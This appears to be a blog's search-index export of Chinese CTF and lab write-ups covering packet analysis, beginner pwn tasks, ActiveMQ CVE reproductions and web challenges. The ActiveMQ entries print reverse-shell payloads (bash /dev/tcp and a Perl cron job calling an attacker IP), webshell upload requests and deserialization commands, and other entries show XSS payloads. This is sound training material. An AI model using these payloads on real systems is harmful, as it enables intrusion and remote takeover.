<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[bugku writeup(分析）]]></title>
    <url>%2F2018%2F10%2F15%2Fbugku3%2F</url>
    <content type="text"><![CDATA[分析flag被盗将流量包下载下来用wireshark打开之后，过滤器: 1http contains flag 直接得到flag 中国菜刀既然是菜刀，估计就有eval了，所以我们先试试过滤 1http contains eval 找到一个数据包，追踪http流后发现一段base64 base64解码之后: 123456789101112@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);if(PHP_VERSION&lt;&apos;5.3.0&apos;)&#123;@set_magic_quotes_runtime(0);&#125;;echo(&quot;X@Y&quot;);$F=&apos;C:\\wwwroot\\3.php&apos;;$P=@fopen($F,&apos;r&apos;);echo(@fread($P,filesize($F)));@fclose($P);;echo(&quot;X@Y&quot;);die(); 虽然代码有点怪异，但是可以知道这一步是在上传文件，并且在执行成功后会回显X@Y,所以我们将过滤规则改为: 1http contains &quot;X@Y&quot; 在第一个数据包里可以看到flag.tar.gz 继续往下看到第三个数据包可以看到内容: 这个大概率是一个压缩包，我们导出来看看(看分组字节流时需要从第三位后开始，因为有个X@Y，并且解码为压缩) 得到flag 这么多数据包提示了先找到getshell的流,先将过滤规则设置为tcp： 看的出来这是一个192.168.116.138在扫描192.168.116.159的端口, 将过滤规则改为： 1tcp and ip.src==192.168.116.138 中间有一段数据包可以看出来3389是开着的，然后攻击机好像在爆破3389，但是最后失败了，现在我们需要的是一个有多次消息连通的端口，继续往下找可以发现445也是开着的，但是好像也失败了，继续往下，有一段4444端口连到1040的，估计这段已经是找到漏洞并且在利用了，因为连接很稳定，并且也没有失败的情况，继续往下可以看到： 这段有点奇怪，大概率是拿到shell了，追踪一下流: 居然直接就找到了flag，那段base64解码之后就行了。 流量分析(貌似是做不了了)网上的wp是说找到b站的up之后进去个人主页可以拿到flag，现在个性签名已经改了。 手机热点先仔细看看提示： 1有一天皓宝宝没了流量只好手机来共享，顺便又从手机发了点小秘密到电脑，你能找到它吗？ 首先我们需要知道，电脑连手机热点上网不仅仅只有WIFI，还有蓝牙共享。先打开流量包，冒出来一大堆不懂的协议，找了找资料之后知道了L2CAP是在蓝牙里用的协议，然后再试试有没有wpa协议，结果是没有，所以现在确定下来是用蓝牙传输的文件了，所以还是先看看蓝牙的协议吧,原文出处: 从文章中可以知道蓝牙传输协议用的是OBEX，所以我们将过滤规则改为: 1obex 可以看到发送了一个secret.rar，所以打开这个数据包看看: 已经可以看到flag.gif了，接下来我们需要将这个文件导出来，看分组字节流之后选择原始数据并保存为一secret.rar: 打开压缩包，图片上就是flag 抓到一只苍蝇这题在做的过程中有点恶心人，首先打开数据包，题目提示了抓到一只苍蝇，抱着试一试的想法： 1http contains &quot;苍蝇&quot; 没想到还真有: 仔细分析一下发现是在发qq邮件，并且还发了文件，所以我们现在试试: 1http.request.method==POST 可以看到第一个数据包是传文件的，然后下面几个可能就是文件内容了： 具体是几个，仔细看看URL，738号数据包有个需要调用函数CheckFile，并且前面的5个数据包url的路径一样，所以从第一个开始，后5个数据包是文件内容，但是由于TCP包有文件头，我们需要去掉文件头才能将原始数据合成一个文件，从第一个数据包可以看出来： 文件大小是525701字节，我们需要的这5个数据包的大小是: 1131436*4+1777=527521 用527521-525701=1820,然后再除以5就是tcp包的文件头了–364我们将分组字节流中的原始数据分别保存为1、2、3、4、5，方便操作然后使用linux的一些工具进行操作即可得到flag.rar这里使用dd： 1dd if=1 bs=1 skip=364 of=1.1 这条命令中if是文件名，bs是多少个字节，skip是多少位，of是保存为哪个文件然后再用linux的输入流来合并成一个文件： 1cat 1.1 2.1 3.1 4.1 5.1 &gt; fly.rar 然后fly.rar又被伪加密了，所以需要将这个文件用winhex打开后，用其中的74 84改为74 80就能打开了， flag.exe打开是乱码，mzp文件头，改为exe可执行文件后。。。一堆苍蝇出现了。将这个文件扔到kali中foremost一下，得到一个二维码，扫码得到flag。 信息提取题目提示了sqlmap,先过滤一下http 一开始的几个数据包可以看出来是在找注入点，并且测试注入点能不能用，一直往后翻看sql语句可以发现这是个盲注，当为真时，回显: 为否则是其它东西，既然要找flag，那就直接看到最后爆列的语句: 这里已经到最后一位了，又因为回显是可以看出来是否成功的，所以我们再加一条过滤规则 1http and ip.src==10.0.0.201 建议从后往前看，因为前面的数据包还有爆列爆库的语句，为了更简单拿到flag，我们直接从后往前看：1Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),34,1))&gt;1: 懂注入的应该知道，其中34是代表着第34位，&gt;1是代表着这个字符的ascll&gt;1，但是第34位没有回显刚刚成功的语句，就证明了flag是33位的，往上看看 第33位124回显成功，但是125回显的是失败的,所以证明了这一位的ascll码是125，以此往上推，最终的flag是 1ISG&#123;BLind_SQl_InJEcTi0N_DeTEcTEd&#125;]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[pwn入坑之col writeup]]></title>
    <url>%2F2018%2F10%2F05%2Fcol%2F</url>
    <content type="text"><![CDATA[由于开学事情比较多，没时间写wp，现在补一补 分析首先照常连上shell，1ls -al 跟fd一样，能看到的只有源代码，看一看代码： 1234567891011121314151617181920212223242526272829303132col@ubuntu:~$ cat col.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf(&quot;usage : %s [passcode]\n&quot;, argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf(&quot;passcode length should be 20 bytes\n&quot;); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system(&quot;/bin/cat flag&quot;); return 0; &#125; else printf(&quot;wrong passcode.\n&quot;); return 0;&#125; 有两个点，第一个是password长度只能是20位，第二个点是check_password( argv[1] )需要等于0x21DD09EC,先来看看这个函数，将传入的字符分为5个部分进行累加，结果必须为0x21DD09EC,所以方法就是将0x21DD09EC拆分成5个int型的数，因为不会做16进制的除法，所以先转为10进制:568134124然后除5等于113626824余4，最后得到: 10x06C5CEC8*4+0x06C5CECC 这里先说下0x06C5CEC8长度问题，自己不太明白所以问了大佬，大佬给出的解释是：1234一个字节是八位,八位也就是八个二进制位,而四个二进制位就是一个十六进制位,所以两个十六进制位就代表一个字节 所以0x06C5CEC8占用的是4个字节，5个就是20个字节(这里其实不太重要，大家应该都懂，只是因为自己这块知识比较薄弱，所以就当写笔记了) 又因为标准输入中是输入不了我们刚刚算出的字符串的，因为他的值超过了ascll的范围所以这里借助python:1python -c &quot;print &apos;\xc8\xce\xc5\x06&apos;*4 + &apos;\xcc\xce\xc5\x06&apos;&quot; \x代表的是16进制，并且目标机器用的小端序，所以payload需要些变化 pwnpayload:1./col `python -c &quot;print &apos;\xc8\xce\xc5\x06&apos;*4 + &apos;\xcc\xce\xc5\x06&apos;&quot;`]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn入坑之fd writeup]]></title>
    <url>%2F2018%2F08%2F25%2Ffd%2F</url>
    <content type="text"><![CDATA[分析首先连上ssh， 1ls -al 查看一下各个文件的权限，这里可以发现flag文件是没有权限看的，但是有对fd.c的读取权限的:12345678910111213141516171819202122fd@ubuntu:~$ cat fd.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf(&quot;pass argv[1] a number\n&quot;); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123; printf(&quot;good job :)\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); &#125; printf(&quot;learn about Linux file IO\n&quot;); return 0;&#125; 对于一个pwn菜鸡来说，各种看不懂，首先接触到的是c的命令行参数，这个很容易学，然后仔细看看代码，找到能输出flag的语句，然后一直往上跟踪，发现当buf等于LETMEWIN\n时，输出flag但是现在怎么控制buf的值是一个问题，找到前面的read函数，能控制buf的值read函数介绍123456 read（）函数 read(int fd, void *buf, size_t count);参数： fd： 将要读取数据的文件描述词。buf：指缓冲区，即读取的数据会被放到这个缓冲区中去。count： 表示调用一次read操作，应该读多少数量的字符。 先来解释一下linux下的文件修饰符,简单来说就是：1230 输入 stdin1 输出 stdout2 错误 stderr 我们需要的是fd为0，使其可以输入LETMEWIN放到buf里，然后再往上看到fd，决定fd值的是我们传入的argv[]，到这就很简单了，将argv[1]的值传入为0x1234，也就是4660， pwn很简单，12./fd 4660然后输出LETMEWIN,回车]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ActiveMQ 反序列化漏洞（CVE-2015-5254）利用]]></title>
    <url>%2F2018%2F08%2F06%2FCVE-2015-5254%2F</url>
    <content type="text"><![CDATA[环境搭建这里采用Vulhub漏洞靶场直接一键搭建 漏洞复现首先粘上给出的文档:12345漏洞利用过程如下：- 构造（可以使用ysoserial）可执行命令的序列化对象- 作为一个消息，发送给目标61616端口- 访问web管理页面，读取消息，触发漏洞 先介绍一下ysoserial,ysoserial是一个Java反序列化工具框架，它包含常见的Java反序列化类型，可以生成一些payload，这里使用jmet,jmet自带ysoserial； 先访问1http://靶机IP:8161 确保环境搭建成功了，然后开始漏洞的利用在攻击机上下载好工具jmet，并且安装java环境12wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jaryum -y install java 执行下列语句: 1java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME 靶机IP 61616 执行成功之后，此时会给目标ActiveMQ添加一个名为event的队列， 我们可以通过访问：1http://靶机IP:8161/admin/browse.jsp?JMSDestination=event 可以看到有一个消息，当管理员点击此消息时会触发刚刚的touch /tmp/success，我们可以在docker环境里看到这个文件，12docker exec -it （dockerid） /bin/shls /tmp/ 可以看到已经成功的创建了success，可以执行命令，所以下一步我们直接反弹一个shell，payload:1bash -i &gt;&amp; /dev/tcp/攻击机IP/8888 0&gt;&amp;1 这里需要一些小技巧来绕过java的机制， 1bash -c &#123;echo,payload的basse64编码&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; 攻击机监听8888端口，然后访问刚刚在消息队列里的消息，即可得到shell]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ActiveMQ任意文件写入漏洞（CVE-2016-3088）利用]]></title>
    <url>%2F2018%2F08%2F05%2FCVE-2016-3088%2F</url>
    <content type="text"><![CDATA[环境搭建这里采用Vulhub漏洞靶场直接一键搭建 漏洞复现这个漏洞在fileserver应用中，这里介绍一下ActiveMQweb控制台的三个应用：12345678admin:管理员页面，对后台进行一系列的操作，需要登录api:普通的接口，同样需要登录fileserver:储存文件的接口，可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但是随后发现：1.其使用率并不高2.文件操作容易出现漏洞所以ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。 (转自docker文档) 所以，漏洞是基于版本的，这里的版本支持fileserver，因为fileserver不仅支持写入文件，还支持移动文件；这个时候我们就能利用这个漏洞了，12345首先写入一个文件，随后使用移动文件的请求将文件移动到任意位置，造成任意文件写入漏洞。文件写入有如下方法可以利用：1.写入webshell2.写入cron或ssh key等文件3.写入jar或jetty.xml等库和配置文件 分析一下这三种方法 写入webshell首先写入webshell，访问:1http:/IP:8161/fileserver/ 确保fileserver是开启的， 虽然是开启的，但是fileserver是不会解析jsp的，所以需要移动到能够解析jsp的目录下，比如说刚刚的提到的api应用目录,但需要知道activemq的绝对路径，所以这种方法比较鸡肋，但是胜在简单，先登录上后台,默认用户名密码均是admin,在:1http://IP:8161/test/systemProperties.jsp 可以看到在opt/activemq/下 然后接下来就比较简单了，利用burpsuite来上传webshell， 1234567891011PUT /fileserver/webshell.txt HTTP/1.1Host: IP:8161Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.9If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMTConnection: closewebshell 当返回204的时候证明已经上传成功了。接下来一步是利用MOVE命令来移动到api目录下解析 12345678910MOVE /fileserver/webshell.txt HTTP/1.1Destination: file:///opt/activemq/webapps/api/webshell.jspHost: IP:8161Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.9If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMTConnection: close 同样的，返回204就证明已经成功了。接下来可以直接访问1http://IP:8161/api/webshell.jsp 可以看到已经成功解析了: 总结一下，这种方法需要先登录后台，并且需要知道目录结构，所以比较鸡肋 写入cron或ssh key等文件同样的方法上传:12345678910111213PUT /fileserver/3.txt HTTP/1.1Host: IP:8161Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.9If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMTConnection: closeContent-Length: 0*/1 * * * * root /usr/bin/perl -e &apos;use Socket;$i=&quot;攻击IP&quot;;$p=端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;## 然后使用MOVE指令移动到/etc/cron.d目录下 12345678910MOVE /fileserver/3.txtHTTP/1.1Destination: file:///etc/cron.d/rootHost: IP:8161Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.9If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMTConnection: close 同样的道理，都返回204就证明成功了，同时攻击机上应该监听端口，等待cron.d执行即可， 写入jetty.xml或jar暂时不会，有时间补上，文档是这样给出来的:123理论上我们可以覆盖jetty.xml，将admin和api的登录限制去掉，然后再写入webshell。有的情况下jetty.xml和jar等所有人是web容器的用户，所以相比起来，写入crontab成功率更高一点。]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>任意文件写入</tag>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hackinglab网络安全实验室writeup]]></title>
    <url>%2F2018%2F07%2F13%2Fhackinglab%2F</url>
    <content type="text"><![CDATA[基础关key在哪里?查看源代码，直接找到flag 再加密一次你就得到key啦~给出的提示是：1加密之后的数据为xrlvf23xfqwsxsqf 凯撒加密移了13位，在线加密选择移位13即可得到key 猜猜这是经过了多少次加密？一看就是base64，一直base64解码即可拿到key 据说MD5加密很安全，真的是么？md5解密 直接得到key 种族歧视打开之后提示only for Foreigner 拿bp抓个包，将Accept-Language:这一栏的内容删掉即可 HAHA浏览器Hint:据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？估计是改user-agent抓包,只要user-agent里出现HAHA即可得到key key究竟在哪里呢？访问后提示：Key就在这里，猜猜这里是哪里呢？(Web找key加强版)抓个包，查看之后发现在响应头里： key又找不到了照常抓包，发现一个key_is_here_now_.php,估计是个302跳转，用bp访问一下，即可得到key 冒充登陆用户访问后提示：您还没有登陆呢！抓包后发现cookie中有一个login=0的参数，改为1即可得到key 比较数字大小题目给了一个输入框，但是限制了长度，同样的，抓包，把v的值网大传，即可得到flag 本地的诱惑题目坏了，但是这题的解题方法就是XFF，在发送包中添加1X-Forwarded-For:127.0.0.1 即可得到key 就不让你访问题目提示：小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方….可最后还是被黑客找到了，并被放置了一个黑页，写到:find you ,no more than 3 secs! 直接扫估计是不行的，试试robots，还真有内容是12345User-agent: *Disallow: /Crawl-delay: 120Disallow: /9fb97531fe95594603aff7e794ab2f5f/Sitemap: http://www.hackinglab.sinaapp.com/sitemap.xml 访问/9fb97531fe95594603aff7e794ab2f5f/,提示1you find me,but I am not the login page. keep search. 提示在login page，直接访问login.php，得到key 脚本关key又又找不到了也是抓包，但是直接看到key了…不清楚原因 快速口算请在2秒内口算结果并提交！ 在2s内算出来机会不大，所以需要写脚本了，附上py脚本 123456789import re import requestss = requests.Session() url = &apos;http://1.hacklist.sinaapp.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&apos;r = s.get(url)num = re.findall(re.compile(r&apos;&lt;br/&gt;\s+(.*)=&lt;input&apos;), r.text)[0] #正则匹配，可以先看看源代码r = s.post(url, data=&#123;&apos;v&apos;: eval(num)&#125;) #计算表达式的值，并将结果提交 抓包可看出要用v提交print (r.text) #输出结果 运行后得到key 这个题目是空的这题有点坑，答案就是null小写 怎么就是不弹出key呢？点了几次不行之后，看看源代码： 可以看到各种return false，但是既然是js的代码，我们就可以在本地搭建将代码复制到本地，然后把前面三个return false的函数干掉 然后本地访问就行了 注意是从chars之后开始的14位 逗比验证码第一期这题的验证码验证一次之后不过期，所以。。抓包爆破即可 爆破之后，密码是1238，拿到key 逗比验证码第二期题目给提示，验证就失效，但是实际上验证一次之后验证码就不需要了，令值为空即可开始爆破。 爆破后得到密码1228，拿到key 逗比的验证码第三期（SESSION）这题做法与上题一样，密码是1298，拿到key 微笑一下就能过关了源代码处点击可以看到源代码 12345678910111213141516171819202122232425262728&lt;?php header(&quot;Content-type: text/html; charset=utf-8&quot;); if (isset($_GET[&apos;view-source&apos;])) &#123; show_source(__FILE__); exit(); &#125; include(&apos;flag.php&apos;); $smile = 1; if (!isset ($_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/\./&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/%/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/[0-9]/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/http/&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0; if (preg_match (&apos;/https/&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0; if (preg_match (&apos;/ftp/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/telnet/&apos;, $_GET[&apos;^_^&apos;])) $smile = 0; if (preg_match (&apos;/_/&apos;, $_SERVER[&apos;QUERY_STRING&apos;])) $smile = 0; if ($smile) &#123; if (@file_exists ($_GET[&apos;^_^&apos;])) $smile = 0; &#125; if ($smile) &#123; $smile = @file_get_contents ($_GET[&apos;^_^&apos;]); if ($smile === &quot;(●&apos;◡&apos;●)&quot;) die($flag); &#125; ?&gt; 这题比较复杂， 首先get提交的参数中不能有特殊字符，数字而且http、https、ftp等协议不能用，$_SERVER[&#39;QUERY_STRING&#39;]中不能出现_字符，但是提交的变量却是^_^并且不能是文件,但是却有个file_get_contents函数， 绕过$_SERVER[&#39;QUERY_STRING&#39;]很简单，因为QUERY_STRING会把.、[等符号解析成_，所以将提交的参数改为^.^、^[^等即可，而绕过file_exists，就是用php的data伪协议，详情请点击php伪协议学习 payload:1^[^=data://text/plain;charset=unicode,(●&apos;◡&apos;●) 逗比的手机验证码这题不清楚为什么要出，没什么技术含量，直接用13388886666手机号获取验证码，然后用13388886667submit就可以得到key 基情燃烧的岁月这题点击获取手机验证码之后提示1手机验证码是：验证码发到手机上了，你看不到..是3位纯数字，开头不为0 看不到，估计是爆破了，但是在爆破之前需要点击一下获取验证码，不然会一直提示错误，然后第一次爆破的结果是： 又得到一个手机号13399999999，同样的方法再爆破一次就能拿到key 验证码识别这题前面的方法都不能用，只能老老实实的识别验证码了，因为全是数字，所以比较好识别，这里用的工具是Pkav HTTP Fuzzer使用方法：将抓到的数据包内容复制粘贴进请求包处 下方的使用与bp差不多，手机验证码变量添加标记即可，验证码变量添加验证码即可，然后将验证码图片的地址复制下来，工具底部有图片型验证码，将地址复制进去，在头部请求加上自己的cookie,在下方点击识别测试： 回到变体设置，设置自己payload，在重放设置栏选择数字自增长模式， 在重放选项处将线程设置为单线程，因为速度过快可能会报错然后底下选择发包器,点击启动即可，一段时间后得到flag XSS基础关XSS的题目在Google浏览器里做不了，所以只能在其他浏览器下做了，这里用的是火狐浏览器XSS可以先看看js的代码，在http://lab1.xseclab.com/xssjs/xss_check.php处可以看到给出key的代码，先试试1&lt;script&gt;alert(HackingLab)&lt;/script&gt; 直接就success，得到了key XSS基础2:简单绕过这题用上题的payload的话会报错，多试几次发现是过滤了&lt;script&gt;，用&lt;img&gt;就能绕过payload:1&lt;img src=haha onerror=alert(HackingLab)&gt; XSS基础3:检测与构造这题输入的值会在下方的input框展示出来，同样过滤了&lt;script&gt;、javascript、&lt;img src&gt; ，但是当查看源代码的时候可以发现，&#39;没有过滤，所以可以用一下闭合的思想，用bp抓包试验一下 输入alert(HackingLab)发现没有过滤alert，但是输入onmouseover=alert(HackingLab)，发现被检测到了，最终发现一个问题，当输入alert时，后面的添加的事件不会被过滤构造payload:1alert&apos;onmouseover=alert(HackingLab)&gt; 然后把鼠标移到第二个输入框即可弹窗，得到key: Principle很重要的XSS这题跟上题类似，但是只是input框变成了href,我用上题的payload直接就得到key了。不清楚为什么给了这么多hint 这些XSS的题目都可以用bp抓响应包来做，应该是后端没有做防护，这里就用最后一个题目做示范首先抓到请求包，右键选择 点击Forward，此时可以看到响应包也就是response包，在下方输入1&lt;img src=haha onerror=alert(HackingLab)&gt; 再点击Forward，因为数据包有点多，所以一直点击Forward直到弹窗就行，弹窗之后还需要点击Forward得到后台给的key，同样能得到key 注入关注入关暂时做不了，题目服务器有问题 上传关请上传一张jpg格式的图片1这题试了几次之后发现是前端验证,上传一个jpg，然后用bp抓包改一下即可拿到key 请上传一张jpg格式的图片2跟第一题一样的做法。 请上传一张jpg格式的图片3这题后端也做了验证，可以先用前面题目的方法试试，发现提交成功但是没有返回key 试了试加一个.jpg 后端代码可能是验证文件名有没有.jpg，拿到key 解密关以管理员身份登录系统打开题目发现这是一个标准的登录框，有忘记密码功能，并且题目提示重置管理员密码就能得到key，先了解一下重置密码功能，在这个输入框中输入的值会被传到后端进行重置，然后给出重置密码链接，但是admin用户重置之后没有提示, 所以我们照常在每个页面都抓包试一试，在这个页面可以看到重置密码链接提交的值中有两个参数，一个是sukey，一个是username 将username改为admin，发现什么都没有显示: 现在只能看另一个参数sukey了，长度看起来像md5，md5解密试试： 解出来是一个时间戳，转为北京时间是2018/7/19 14:5:54 就是我刚刚提交的时间，所以思路大概就是将上传的时间转为Unix时间戳，然后md5加密，将sukey和username分别等于md5加密后的时间戳和admin提交，并且响应包得到的时间是比实际时间少的， 这里给出两种做法 第一种是手动将响应包里的时间手动转为Unix时间戳 第二种是用脚本获取响应包的时间 第一种： 先提交username为admin，然后记录下响应头的date 然后去在线网站转为时间戳,记住小时需要跟北京时间一样，其他都一样 将sukey等于时间戳md5加密后的值访问即可， 得到key 第二种是用python，但是time()函数得到的当前时间戳与上传时的对不上，所以只能与手动的方法一样，从响应头里获取时间。附上脚本:1234567891011121314151617import requests,hashlib,time,redef month(month): months = [&quot;Jua&quot;,&quot;Feb&quot;,&quot;Mar&quot;,&quot;Apr&quot;,&quot;May&quot;,&quot;Jun&quot;,&quot;Jul&quot;,&quot;Aug&quot;,&quot;Sep&quot;,&quot;Oct&quot;,&quot;Nov&quot;,&quot;Dec&quot;] for a in range(0,len(months)): if months[a] == month: return a+1r = requests.session()url = &apos;http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/resetpassword.php&apos;post = &#123;&apos;username&apos;:&apos;admin&apos;&#125;a = r.post(url,data = post)list = re.compile(r&apos;[\,\s\:]+&apos;).split(a.headers[&apos;date&apos;])ct = (list[3]+&apos;-&apos;+str(month(list[2]))+&apos;-&apos;+list[1]+&apos; &apos;+str(int(list[4])+8)+&apos;:&apos;+list[5]+&apos;:&apos;+list[6])sukey = hashlib.new(&apos;md5&apos;,str(int(time.mktime(time.strptime(ct,&apos;%Y-%m-%d %H:%M:%S&apos;)))).encode(encoding=&apos;utf-8&apos;)).hexdigest()url2 = &apos;http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=&apos;+sukey+&apos;&amp;username=admin&apos;print(r.get(url2).text) 邂逅对门的妹纸这题给的是一个wifi的握手包，kali中有专门的工具来破解握手包aircrack，但是需要字典，给了年级和年份，估计密码就是生日了，先从网上下载一个生日字典，也可以自己生成使用方法1aircrack-ng wifi-crack.cap -w pass.txt 得到生日密码之后按照题目要求加密提交即可 万恶的Cisco直接GoogleCisco破解,Cisco思科密码在线解密 万恶的加密huawei交换机的加密方式，有人写过python工具使用方法1python27 hh3c_cipher.py -c &quot;aK9Q4I)J&apos;#[Q=^Q`MAF4&lt;1!!&quot; 喜欢泡网吧的小明给的是一个dump文件，里头的内容有些看不懂，看了网上的wp才知道做的，1首先将当下的数据不做改动，进行刷卡，显示卡片异常。说明，卡片的头信息错误。一般的卡片的头信息应该是前8~16个字节。头信息应该有个开始和结束标准信息。 直接将文件上传的话会显示卡片异常，并且题目提示了有一个字节产生了错误。 网上给的wp是将开头的AA变为8A, 原因是头部信息错误所以读取失败，具体为什么改为8A也不清楚，但是改为8A后，提示: 可以正常刷卡了，但是余额为100，往下看文件内容，有1027，转为10进制是4135，没有啥关系，但是这些卡的加密方式是有可能倒叙的，所以再试试2710，可以发现刚好是10000，对应的是100.00，所以我们现在只需要将20000转为16进制，然后倒序即可,将两个1027的值改为204E，保存再上传即可 异常数据题目给出一段加密后的字符1AGV5IULSB3ZLVSE= 数字和字母，估计是base32，但是base32解不出，所以大概率是base64，只是把其中的小写字母换成了大写，base64是3位为一组，加密成4个字节，所以分成1234AGV5IULSB3ZLVSE= 首先看看第一次解密: 出了乱码，所以将A改为小写 可以发现思路就是这样，hey已经出来了，所以可以进行下一组，重复这个步骤即可 最终为 1234aGV5IUlsb3ZlVSE= 解码链接 md5真的能碰撞嘛?题目点击__后，可以直接看到源码，1234567891011121314&lt;?php$flag=FLAG;if(isset($_POST[&quot;password&quot;]))&#123; $password=$_POST[&apos;password&apos;]; $rootadmin=&quot;!1793422703!&quot;; if($password==$rootadmin)&#123;die(&quot;Please do not attack admin account!&quot;);&#125; if(md5($password)==md5($rootadmin))&#123; echo $flag; &#125;else&#123; die(&quot;Password Error!&quot;); &#125;&#125;?&gt; 大概意思就是$rootadmin的md5要跟上传上去的值的md5一样，而且本身的值也不能一样先看看!1793422703!的md5是多少,10e332932043729729062996282883873 0e后面全是数字，php弱类型，POST1password=240610708或者QNKCDZO 拿到key 小明爱上了一个搞硬件的小姑凉题目给的是一个logicdata文件，提示是一个逻辑分析仪抓包数据，winhex打开之后，在文件的最后有一串英文， 搜一搜saleae,发现需要下载这个公司的软件才能解密下载链接下载完用这个号软件打开之后即可看到答案，英文不好的同学注意，COMMA是逗号的意思 有签名限制的读取任意文件右键查看源代码可以看到部分代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);include &quot;_flag.php&quot;;include &quot;salt.php&quot;;$mysalt=SALT;if(isset($_GET[&apos;filepath&apos;])&amp;&amp;!empty($_GET[&apos;filepath&apos;]) &amp;&amp;isset($_GET[&apos;sign&apos;]) &amp;&amp;!empty($_GET[&apos;sign&apos;]))&#123; myreadfile($_GET[&apos;filepath&apos;],$mysalt,$_GET[&apos;sign&apos;]); &#125;else&#123; //降低一点复杂度 var_dump(strlen($mysalt)); testsign(&quot;/etc/hosts&quot;,$mysalt);&#125;function myhash($message,$mysalt)&#123; return md5($mysalt.$message);&#125;function checksign($message,$mysalt,$sign)&#123; if($sign==myhash($message,$mysalt))&#123; return True; &#125;else&#123; return False; &#125;&#125;function myreadfile($filepath,$mysalt,$sign)&#123; $res=checksign($filepath,$mysalt,$sign); if($res)&#123; echo getfile($filepath); &#125; else&#123; echo &apos;sign error!&apos;; &#125;&#125;function testsign($filepath,$mysalt)&#123; echo myhash($filepath,$mysalt);&#125;echo &quot;&lt;!--&quot;.file_get_contents(__FILE__); 题目已经给出提示MD5 Length Extension 